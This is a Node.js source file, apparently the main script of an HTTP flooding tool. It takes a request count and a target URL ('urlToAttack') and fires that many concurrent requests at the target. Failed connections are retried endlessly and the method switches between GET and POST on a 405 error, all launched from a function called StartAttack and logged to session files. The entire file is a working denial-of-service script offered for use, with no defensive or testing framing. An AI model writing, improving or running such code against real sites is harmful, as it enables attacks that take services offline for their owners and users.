import fs from "fs"
import url from "url"
import fetch from "node-fetch"
import config from "./config.js"
import prompt from "prompt-sync"
const prompt_in = prompt({ sigint: true });

let count = process.argv[2];
let urlToAttack = process.argv[3];
let connectionTimeLimit = Number(process.argv[4]);
let execLimit = Number(process.argv[5]);
let requestMethod = process.argv[6];

const date = new Date();
const startHour = date.getHours();
const startMins = date.getMinutes();
const startSecs = date.getSeconds();
const startMili = date.getMilliseconds();

let complete = false;

let activeProcess = count;
let history = `
`;

function Save() {
    const newDate = new Date();
    const endHour = newDate.getHours();
    const endMins = newDate.getMinutes();
    const endSecs = newDate.getSeconds();
    const endMili = newDate.getMilliseconds();

    const sessionID = Math.floor(Math.random() * 500) + "";
    let data =
`
session: ${sessionID}
site: ${urlToAttack}
requests: ${count}

start hour: ${startHour}
start minutes: ${startMins}
start seconds: ${startSecs}
start miliseconds: ${startMili}

end hour: ${endHour}
end minutes: ${endMins}
end seconds: ${endSecs}
end miliseconds: ${endMili}

success: ${complete}

history:
${history}`;

if (complete) history += `
[${endHour}:${endMins}:${endSecs}.${endMili}] All requests have been completed`;
    fs.writeFile(`./filters/filter#${sessionID}.filter`, data += complete == true ? `[${endHour}:${endMins}:${endSecs}.${endMili}] All requests have been completed` : "", (err) => {
        if (err) throw err;

        clearInterval(loopInterval);
        console.log(`Saved to file: filter#${sessionID}`);
        process.abort();
    });
}

const requestBody = {
    item: "0tm 4- epmr´pwemfipdfm",
    itadem: "0tm 4- epmr´pwemfipdfm",
    itedam: "0tm 4- epmr´pwemfipdfm",
    itesdam: "0tm 4- epmr´pwemfipdfm",
    itgtaaegtem: "0tm 4- epmr´pwemfipdfm",
};

function Abort() {
    const date = new Date();
    console.log(`[${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}.${date.getMilliseconds()}] ALERT: program aborted`);
    history += `[${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}.${date.getMilliseconds()}] ALERT: program aborted`;
    Save();
}

class Connection {
    constructor(id, method) {
        this.id = id;
        this.method = method;
        this.connect();
    }

    async connect() {
        const date = new Date();
        const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}.${date.getMilliseconds()}`;
        let a_status;
        try {
            console.log(`[${time}] Start new connection no. ${this.id} in ${urlToAttack} method: ${this.method}`);
            history += `[${time}] Start new connection no. ${this.id} in ${urlToAttack}
`;
            const res = await fetch(urlToAttack, {
                timeout: connectionTimeLimit,
                method: this.method
            });
            a_status = res.status;

            if (res.ok) {
                console.log(`[${time}] Connection no. ${this.id} returned 'ok' on ${urlToAttack}`);
                history += `[${time}] Connection no. ${this.id} returned 'ok' on ${urlToAttack}
`;
                activeProcess -= 1;
            } else {
                console.error(`[${time}] Connection error no. ${this.id} with code: ${res.status} trying again on ${urlToAttack}`);
                history += `[${time}] Connection error no. ${this.id} with code: ${res.status} trying again on ${urlToAttack}
`;              
                if (res.status == 405) {
                    if (this.method.toUpperCase() == "POST")
                        new Connection(this.id, "GET");
                    else
                        new Connection(this.id, "POST");
                }
            }
        } catch (err) {
            console.log(`[${time}] Connection error: '${err} 504', trying connection no. ${this.id} again on ${urlToAttack}`);
            history += `[${time}]  Connection error: '${err} 504', trying connection no. ${this.id} again on ${urlToAttack}
`;
            new Connection(this.id, this.method);
        }
    }
}

function StartAttack() {
    let connectList = [];
    for (let i = 0; i < count; i++) {
        connectList.push(new Connection(i, requestMethod));
    }
    setTimeout(Abort, execLimit);
}

let loopInterval = setInterval(Loop, 1000);
function Loop() {
    if (activeProcess < 1) complete = true, Save(), clearInterval(loopInterval);
}

function ShowHelp() {
    console.log(`
to exec:
    node main.js <requests-count> <hostname> <time-connection-limit> <execution-time-limit> <method: GET-POST>

    `);
    clearInterval(loopInterval);
}

Start();
function Start() {
    if (count == "--help") {
        ShowHelp();
        return;
    }

    for (let i = 0; i < 1000; i++) {
        requestBody[Math.floor(Math.random() * 999999)] = BigInt(Math.floor(Math.random() * 500) * Math.floor(Math.random() * 500) ** 2)
    }

    if (urlToAttack == undefined) {
        console.log(`You you have not set even one parameter`);
        const useDefault = true;
        
        console.log(config);
        count = config.requests;
        urlToAttack = config.url;
        connectionTimeLimit = config.connectTimeLimit;
        execLimit = config.executionLimit;
        requestMethod = config.method;
    }

    if (url.parse(urlToAttack).protocol == "http:" || url.parse(urlToAttack).protocol == "https:") StartAttack();
    else {
        return;
    }
}